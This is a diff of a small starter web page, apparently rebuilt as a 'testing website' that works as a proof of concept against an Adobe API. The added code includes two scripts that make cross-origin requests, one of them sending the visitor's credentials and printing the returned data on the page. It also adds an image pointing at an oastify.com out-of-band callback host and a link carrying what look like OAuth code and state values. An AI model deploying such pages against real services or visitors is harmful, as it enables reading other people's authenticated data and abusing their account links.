@@ -446,52 +446,38 @@
 
 
 <head>
-  <!-- 
-      This is an HTML comment
-      You can write text in a comment and the content won't be visible in the page
-    -->
-
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link rel="icon" href="https://glitch.com/favicon.ico" />
-
-  <!--
-      This is the page head - it contains info the browser uses
-      Like the title, which appears on the browser tab but not inside the page
-      Further down you'll see the content that displays in the page
-    -->
-  <title>Hello World!</title>
-
+  <title>Hello There!</title>
   <!-- The website stylesheet -->
   <link rel="stylesheet" href="/style.css" />
-
   <!-- The website JavaScript file -->
   <script src="/script.js" defer></script>
   <script>
     fetch("https://dc-api-v2.adobe.io/177189244/msft/connector/list").then(r => r.text()).then(t => console.log(t)).catch(e => console.log("blocked", e));
 </script>
-
 </head>
-
 <body>
-  <!--
-      The body includes the content you see in the page
-      Each element is defined using tags, like this <div></div>
-      The attributes like class="wrapper" let us style elements in the CSS
-    -->
   <div class="wrapper">
     <div class="content" role="main">
-      <h1 class="title">Oh hi website!</h1>
+      <h1 class="title">This is my testing website!</h1>
       <img src="wjjclhfh1o2d7d82o0fxfrzrrix9lz9o.oastify.com" class="illustration" alt="cool website" />
       <div class="instructions">
         <p>
-          
+          Check <a href="https://acrobat.adobe.com/link/documents/addstorage?code=M.C504_BL2.2.U.f838963e-9871-3837-7d59-8c948d61101a&state=cc66ad1a-f438-4761-a7a1-a010f73ffd3b"> project</a>.
         </p>
-        <p> Follow the steps in the README to deploy your new website to Fastly in a few steps!
+        <p>
+          <script>
+            fetch("https://dc-api-v2.adobe.io/1771892144/msft/connector/list", {
+              method: "GET",
+              credentials: "include"})
+              .then(r => r.text())
+              .then(t => {document.body.innerText = "SUCCESS:\n" + t.slice(0, 200);})
+              .catch(e => {document.body.innerText = "BLOCKED:\n" + e;});
+          </script>
         </p>
-
       </div>
-
       <footer class="footer">
         <div>
         </div>
@@ -499,5 +485,4 @@
     </div>
   </div>
 </body>
-
 </html>
